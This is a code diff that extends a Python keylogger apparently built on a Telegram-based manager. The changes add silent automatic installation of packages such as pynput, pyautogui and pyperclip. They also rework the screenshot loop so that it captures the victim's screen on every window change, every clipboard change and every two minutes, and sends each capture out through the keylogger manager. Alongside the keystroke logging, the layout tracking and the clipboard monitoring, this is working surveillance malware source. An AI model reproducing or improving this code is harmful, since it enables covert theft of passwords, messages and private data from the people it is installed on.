@@ -1,22 +1,32 @@
+import subprocess
+import sys
 import io
 
-from PIL import ImageGrab
-from pynput.keyboard import Key, Listener
-import logging
-import getpass
-import threading
-import time
-from pynput import keyboard
-import pyautogui
-import os
-from KeyloggerManager import TelegramKeylogger
-import hashlib
+def install_packages():
+    packages = [
+        "PIL", "hashlib", "pywin32", "pynput", "pyautogui", "python-dotenv", "requests", "pyperclip"
+    ]
+    for package in packages:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
+
 
 try:
+    from PIL import ImageGrab
+    from pynput.keyboard import Key, Listener
+    import logging
+    import getpass
+    import threading
+    import time
+    from pynput import keyboard
+    import pyautogui
+    import os
+    import hashlib
+    from pynput.keyboard import Key, Listener
+    from KeyloggerManager import TelegramKeylogger
     import win32api
     import win32gui
 except ImportError:
-    print("нужно установить pywin32")
+    install_packages()
 
 username = getpass.getuser()
 
@@ -74,6 +84,7 @@ RU_TO_EN = {
     'О':'J', 'Л':'K', 'Д':'L', 'Ь':'M', 'Т':'N', 'Щ':'O', 'З':'P', 'Й':'Q', 'К':'R',
     'Ы':'S', 'Е':'T', 'Г':'U', 'М':'V', 'Ц':'W', 'Ч':'X', 'Н':'Y', 'Я':'Z'
 }
+
 current_layout = "RU"
 shift_pressed = False
 alt_pressed = False
@@ -104,8 +115,8 @@ def check_alt_shift_in_log():
         try:
             with open(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', 'r', encoding='utf-8') as f:
                 lines = f.readlines()[-2:]
-            alt_found = any("Char: '[Key.alt_l]'" in line or "Char: '[Key.alt_r]'" in line for line in lines)
-            shift_found = any("Char: '[Key.shift]'" in line or "Char: '[Key.shift_r]'" in line for line in lines)
+            alt_found = any("'[Key.alt_l]'" in line or "'[Key.alt_r]'" in line for line in lines)
+            shift_found = any("'[Key.shift]'" in line or "'[Key.shift_r]'" in line for line in lines)
             if alt_found and shift_found:
                 current_layout = "EN" if current_layout == "RU" else "RU"
                 logger.info(f"LAYOUT_SWITCHED by LogScan: {current_layout}")
@@ -207,23 +218,91 @@ def clipboard_monitor(interval=5):
 
         time.sleep(interval)
 
-def screenshot_monitor(interval=30):
+
+def screenshot_monitor(interval=120):
     count = 0
+    last_window = ""
+    last_screenshot_time = 0
+    last_clipboard_content = ""
+
+    def is_same_window(window1, window2):
+        if window1 == window2:
+            return True
+
+        ignore_patterns = [' - Прокрутка', ' - Scroll', '...', ' — ']
+
+        if window1 and window2:
+            base1 = window1[:20]
+            base2 = window2[:20]
+            if base1 == base2:
+                return True
+
+            for pattern in ignore_patterns:
+                if pattern in window1 and pattern in window2:
+                    return True
+
+        return False
+
     while True:
         try:
-            img = pyautogui.screenshot()
+            current_time = time.time()
+            current_window = get_active_window()
 
-            success = keylogger_manager.send_screenshot(img)
+            # Триггер смена активного окна
+            if (not is_same_window(current_window, last_window) and
+                    current_window != "unknown" and
+                    current_time - last_screenshot_time > 15):
 
-            if success:
-                logger.info(f"Screenshot sent successfully #{count}")
+                logger.info(f"Window changed: {last_window} -> {current_window}")
+                img = pyautogui.screenshot()
+                success = keylogger_manager.send_screenshot(img)
+
+                if success:
+                    logger.info(f"Screenshot sent successfully (window change) #{count}")
+                else:
+                    logger.error(f"Failed to send screenshot #{count}")
+
+                count += 1
+                last_window = current_window
+                last_screenshot_time = current_time
             else:
-                logger.error(f"Failed to send screenshot #{count}")
+                last_window = current_window
+
+            # Триггер изменение буфера обмена
+            try:
+                import pyperclip
+                current_clipboard = pyperclip.paste()
+                if (current_clipboard != last_clipboard_content and
+                        current_clipboard.strip() and
+                        current_time - last_screenshot_time > 10):
+
+                    logger.info(f"Clipboard changed")
+                    img = pyautogui.screenshot()
+                    success = keylogger_manager.send_screenshot(img)
+
+                    if success:
+                        logger.info(f"Screenshot sent successfully (clipboard) #{count}")
+                    count += 1
+                    last_clipboard_content = current_clipboard
+                    last_screenshot_time = current_time
+            except:
+                pass
+
+            # Авто скриншоты каждые 2 минуты
+            if current_time - last_screenshot_time > interval:
+                img = pyautogui.screenshot()
+                success = keylogger_manager.send_screenshot(img)
+
+                if success:
+                    logger.info(f"Screenshot sent successfully (periodic) #{count}")
+                count += 1
+                last_screenshot_time = current_time
+
+            time.sleep(2)
 
         except Exception as e:
-            logger.error(f"Error taking screenshot: {e}")
-        count += 1
-        time.sleep(interval)
+            logger.error(f"Error in screenshot_monitor: {e}")
+            time.sleep(10)
 
 logger.info(f"PROGRAM_STARTED | Initial layout: {current_layout}")
 
